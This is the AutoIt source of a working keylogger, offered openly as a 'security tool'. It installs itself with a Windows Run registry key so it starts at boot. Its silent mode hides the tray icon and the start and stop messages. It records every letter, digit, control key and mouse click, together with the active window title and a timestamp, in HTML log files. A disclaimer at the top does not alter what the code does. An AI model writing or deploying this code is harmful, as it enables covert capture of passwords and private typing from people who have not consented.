#CS This is a simple keylogger Created By Jason Zetter
	this is created as a security tool and i cannot be held responsible for any missuse of this program

	Help:
	/install - Installs the program with an interface
	/install /silent - installs the program with the defauld valuse in silent
	/help - displays this help box
	/uninstall - this removes the program and all the settings from your system WARNING this DOES remove the log files.

	This Program was created with the Awsome Freeware Basic programing language Auto-it!

	For updates and other Programs Created by Jazo-tools Send your browser to Http://www.jazo-online.com.au.tt
#CE

;-------------------------------------------------------------comandline code for help install and ninstall
;$hDll = DllOpen("user32.dll"); <-- near the start of your script

;Func _IsPressed()
;	[...]
;     DllCall($hDll, "int", "GetAsyncKeyState", "int", $hexKey)
;     [...]
;EndFunc

break(0);disllow close from the tasktray
$i = 0
If $cmdline[0] > 0 Then
	If $cmdline[1] = "/install" Then
		If $cmdline[0] >= 2 Then
			If $cmdline[2] = "/silent" Then;auto install Script Silently
				RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Jazo tools\log", "exit", "REG_SZ", "e")
				RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Jazo tools\log", "Location", "REG_SZ", @ProgramFilesDir & "\Jazo-Tools\keylogger\")
				RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Jazo tools\log", "Silent", "REG_DWORD", "1")
				FileCopy(@ScriptFullPath, @ProgramFilesDir & "\Jazo-Tools\keylogger\" & @ScriptName, 1)
				RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "Jtlog.exe", "REG_SZ", @ProgramFilesDir & "\Jazo-Tools\keylogger\" & @ScriptName)
				$i = 1
			EndIf
		EndIf
		If $i = 0 Then
			$shortcut = InputBox("Jazo-Tools Keylogger", "please Enter your short cut key Ctrl+Alt+(your key)" & @CRLF & "Default is e. WARNING! Enter ONE letter only!")
			$startup = MsgBox(4, "Jazo-Tools Keylogger", " Would you like this program to run at startup?")
			$silent = MsgBox(4, "Jazo-Tools Keylogger", " Would you like this program to run Silent?" & @CRLF & @CRLF & "the program will not display a message when it is starting or closing, and it will not show an icon in the tasktray.")
			$location = FileSelectFolder("Choose an Install Location.  The Logfiles will be located in this directory Under 'Logfiles'", "", 3)
			DirCreate($location & "\Jazo-Tools\keylogger\")
			If $silent = 6 Then $silent = 1
			If $silent = 7 Then $silent = 0
			RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Jazo tools\log", "exit", "REG_SZ", $shortcut)
			RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Jazo tools\log", "Location", "REG_SZ", $location & "\Jazo-Tools\keylogger\")
			RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Jazo tools\log", "Silent", "REG_DWORD", $silent)
			FileCopy(@ScriptFullPath, $location & "\Jazo-Tools\keylogger\" & @ScriptName, 1)
			If $startup = 6 Then RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "Jtlog.exe", "REG_SZ", $location & "\Jazo-Tools\keylogger\" & @ScriptName)

		EndIf
	EndIf
	If $cmdline[1] = "/help" Then
		MsgBox(0, "Jazo-Tools Keylogger", "This is a simple keylogger Created By Jason Zetter" & @CRLF & "this is created as a security tool and i cannot be held responsible for any missuse of this program" & @CRLF & "" & @CRLF & "Help:" & @CRLF & "/install - Installs the program with an interface" & @CRLF & "/install /silent - installs the program with the defauld valuse in silent" & @CRLF & "/help - displays this help box" & @CRLF & "/uninstall - this removes the program and all the settings from your system WARNING this DOES remove the log files." & @CRLF & "" & @CRLF & "This Program was created with the Awsome Freeware Basic programing language Auto-it!" & @CRLF & "" & @CRLF & "For updates and other Programs Created by Jazo-tools Send your browser to Http://www.jazo-online.com.au.tt")
		Exit
	EndIf
	If $cmdline[1] = "/uninstall" Then
		$log = RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Jazo tools\log", "Location")
		RegDelete("HKEY_LOCAL_MACHINE\SOFTWARE\Jazo tools\log")
		MsgBox(0, "", $log)
		DirRemove($log, 1)
		MsgBox(0, "Jazo-Tools Keylogger", "The keylogger has been removed Thankyou For your use of this program!")
		Exit
	EndIf
EndIf
;-----------------------------------------------------Check if program is installed... if not install it------------------------------
$var = RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Jazo tools\log", "")
If $var <= 1 Then
	$shortcut = InputBox("Jazo-Tools Keylogger", "please Enter your short cut key Ctrl+Alt+(your key)" & @CRLF & "Default is e. WARNING! Enter ONE letter only!")
	$startup = MsgBox(4, "Jazo-Tools Keylogger", " Would you like this program to run at startup?")
	$silent = MsgBox(4, "Jazo-Tools Keylogger", " Would you like this program to run Silent?" & @CRLF & @CRLF & "the program will not display a message when it is starting or closing, and it will not show an icon in the tasktray.")
	$location = FileSelectFolder("Choose an Install Location.  The Logfiles will be located in this directory Under 'Logfiles'", "", 3)
	DirCreate($location & "\Jazo-Tools\keylogger\")
	If $silent = 6 Then $silent = 1
	If $silent = 7 Then $silent = 0
	RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Jazo tools\log", "exit", "REG_SZ", $shortcut)
	RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Jazo tools\log", "Location", "REG_SZ", $location & "\Jazo-Tools\keylogger\")
	RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Jazo tools\log", "Silent", "REG_DWORD", $silent)
	FileCopy(@ScriptFullPath, $location & "\Jazo-Tools\keylogger\" & @ScriptName, 1)
	If $startup = 6 Then RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "Jtlog.exe", "REG_SZ", $location & "\Jazo-Tools\keylogger\" & @ScriptName)
EndIf

;------------------------------------------------------------Set Settings--------------------
$window2 = ""
$date = @YEAR & @MON & @MDAY
$log = RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Jazo tools\log", "Location")
$exit = RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Jazo tools\log", "exit")
$silent = RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Jazo tools\log", "silent")
DirCreate($log)
HotKeySet("^!" & $exit, "Terminate");Shift-Alt-d
If $silent = 0 Then TrayTip("Jazo-Tools Keylogger", "Your System is now Protected", "", 1)
Opt("TrayIconHide", $silent)
;------------------------------------------------Other Functions------------------
Func _IsPressed($hexKey)
	Local $aR, $bRv
	$hexKey = '0x' & $hexKey
	$aR = DllCall("user32", "int", "GetAsyncKeyState", "int", $hexKey)

	If $aR[0] <> 0 Then
		$bRv = 1
	Else
		$bRv = 0
	EndIf
	Return $bRv
EndFunc   ;==>_IsPressed

$file = FileOpen("logfile" & $date & ".htm", 1)
If $file = -1 Then
	Exit
EndIf
FileWrite($file, "<font face=Verdana size=1>")

Func Terminate()
	If $silent = 0 Then TrayTip("Jazo-Tools Keylogger", "Your System is no Longer Protected", 15, 3)
	Sleep(1000)
	Exit 0
EndFunc   ;==>Terminate
Opt("OnExitFunc", "Terminate")
While 1
	;---------------------------------------------end program header, begin program----------------------------
	If _IsPressed(41) Then
		_LogKeyPress("a")
	EndIf

	If _IsPressed(42) Then
		_LogKeyPress("b")
	EndIf

	If _IsPressed(43) Then
		_LogKeyPress("c")
	EndIf

	If _IsPressed(44) Then
		_LogKeyPress("d")
	EndIf

	If _IsPressed(45) Then
		_LogKeyPress("e")
	EndIf

	If _IsPressed(46) Then
		_LogKeyPress("f")
	EndIf

	If _IsPressed(47) Then
		_LogKeyPress("g")
	EndIf

	If _IsPressed(48) Then
		_LogKeyPress("h")
	EndIf

	If _IsPressed(49) Then
		_LogKeyPress("i")
	EndIf

	If _IsPressed('4a') Then
		_LogKeyPress("j")
	EndIf

	If _IsPressed('4b') Then
		_LogKeyPress("k")
	EndIf

	If _IsPressed('4c') Then
		_LogKeyPress("l")
	EndIf

	If _IsPressed('4d') Then
		_LogKeyPress("m")
	EndIf

	If _IsPressed('4e') = 1 Then
		_LogKeyPress("n")
	EndIf

	If _IsPressed('4f') Then
		_LogKeyPress("o")
	EndIf

	If _IsPressed(50) Then
		_LogKeyPress("p")
	EndIf

	If _IsPressed(51) Then
		_LogKeyPress("q")
	EndIf

	If _IsPressed(52) Then
		_LogKeyPress("r")
	EndIf

	If _IsPressed(53) Then
		_LogKeyPress("s")
	EndIf

	If _IsPressed(54) Then
		_LogKeyPress("t")
	EndIf

	If _IsPressed(55) Then
		_LogKeyPress("u")
	EndIf

	If _IsPressed(56) Then
		_LogKeyPress("v")
	EndIf

	If _IsPressed(57) Then
		_LogKeyPress("w")
	EndIf

	If _IsPressed(58) Then
		_LogKeyPress("x")
	EndIf

	If _IsPressed(59) Then
		_LogKeyPress("y")
	EndIf

	If _IsPressed('5a') Then
		_LogKeyPress("z")
	EndIf

	If _IsPressed('01') Then
		_LogKeyPress("<font color=#008000 style=font-size:9px><i>{LEFT MOUSE}</i></font>")
	EndIf

	If _IsPressed('02') Then
		_LogKeyPress("<font color=#008000 style=font-size:9px><i>{RIGHT MOUSE}</i></font>")
	EndIf

	If _IsPressed('08') Then
		_LogKeyPress("<font color=#FF8000 style=font-size:9px><i>{BACKSPACE}</i></font>")
	EndIf

	If _IsPressed('09') Then
		_LogKeyPress("<font color=#FF8000 style=font-size:9px><i>{TAB}</i></font>")
	EndIf

	If _IsPressed('0d') Then
		_LogKeyPress("<font color=#FF8000 style=font-size:9px><i>{ENTER}</i></font>")
	EndIf

	If _IsPressed('10') Then
		_LogKeyPress("<font color=#FF8000 style=font-size:9px><i>{SHIFT}</i></font>")
	EndIf

	If _IsPressed('11') Then
		_LogKeyPress("<font color=#FF8000 style=font-size:9px><i>{CTRL}</i></font>")
	EndIf

	If _IsPressed('12') Then
		_LogKeyPress("<font color=#FF8000 style=font-size:9px><i>{ALT}</i></font>")
	EndIf

	If _IsPressed('13') Then
		_LogKeyPress("<font color=#FF8000 style=font-size:9px><i>{PAUSE}</i></font>")
	EndIf

	If _IsPressed('14') Then
		_LogKeyPress("<font color=#FF8000 style=font-size:9px><i>{CAPSLOCK}</i></font>")
	EndIf

	If _IsPressed('1b') Then
		_LogKeyPress("<font color=#FF8000 style=font-size:9px><i>{ESC}</i></font>")
	EndIf

	If _IsPressed('20') Then
		_LogKeyPress(" ")
	EndIf

	If _IsPressed('21') Then
		_LogKeyPress("<font color=#FF8000 style=font-size:9px><i>{PGUP}</i></font>")
	EndIf

	If _IsPressed('22') Then
		_LogKeyPress("<font color=#FF8000 style=font-size:9px><i>{PGDOWN}</i></font>")
	EndIf

	If _IsPressed('23') Then
		_LogKeyPress("<font color=#FF8000 style=font-size:9px><i>{END}</i></font>")
	EndIf

	If _IsPressed('24') Then
		_LogKeyPress("<font color=#FF8000 style=font-size:9px><i>{HOME}</i></font>")
	EndIf

	If _IsPressed('25') Then
		_LogKeyPress("<font color=#008000 style=font-size:9px><i>{LEFT ARROW}</i></font>")
	EndIf

	If _IsPressed('26') Then
		_LogKeyPress("<font color=#008000 style=font-size:9px><i>{UP ARROW}</i></font>")
	EndIf

	If _IsPressed('27') Then
		_LogKeyPress("<font color=#008000 style=font-size:9px><i>{RIGHT ARROW}</i></font>")
	EndIf

	If _IsPressed('28') Then
		_LogKeyPress("<font color=#008000 style=font-size:9px><i>{DOWN ARROW}</i></font>")
	EndIf

	If _IsPressed('2c') Then
		_LogKeyPress("<font color=#FF8000 style=font-size:9px><i>{PRNTSCRN}</i></font>")
	EndIf

	If _IsPressed('2d') Then
		_LogKeyPress("<font color=#FF8000 style=font-size:9px><i>{INSERT}</i></font>")
	EndIf

	If _IsPressed('2e') Then
		_LogKeyPress("<font color=#FF8000 style=font-size:9px><i>{DEL}</i></font>")
	EndIf

	If _IsPressed('30') Then
		_LogKeyPress("0")
	EndIf

	If _IsPressed('31') Then
		_LogKeyPress("1")
	EndIf
	If _IsPressed('32') Then
		_LogKeyPress("2")
	EndIf
	If _IsPressed('33') Then
		_LogKeyPress("3")
	EndIf
	If _IsPressed('34') Then
		_LogKeyPress("4")
	EndIf
	If _IsPressed('35') Then
		_LogKeyPress("5")
	EndIf
	If _IsPressed('36') Then
		_LogKeyPress("6")
	EndIf
	If _IsPressed('37') Then
		_LogKeyPress("7")
	EndIf
	If _IsPressed('38') Then
		_LogKeyPress("8")
	EndIf

	If _IsPressed('39') Then
		_LogKeyPress("9")
	EndIf

WEnd
Func _LogKeyPress($what2log)
	$window = WinGetTitle("")
	If $window = $window2 Then
		FileWrite($file, $what2log)
		Sleep(100)
	Else
		$window2 = $window
		FileWrite($file, "<br><BR>" & "<b>[" & @YEAR & "." & @MON & "." & @MDAY & "  " & @HOUR & ":" & @MIN & ":" & @SEC & ']  Window: "' & $window & '"</b><br>' & $what2log)
		Sleep(100)
	EndIf
EndFunc   ;==>_LogKeyPress
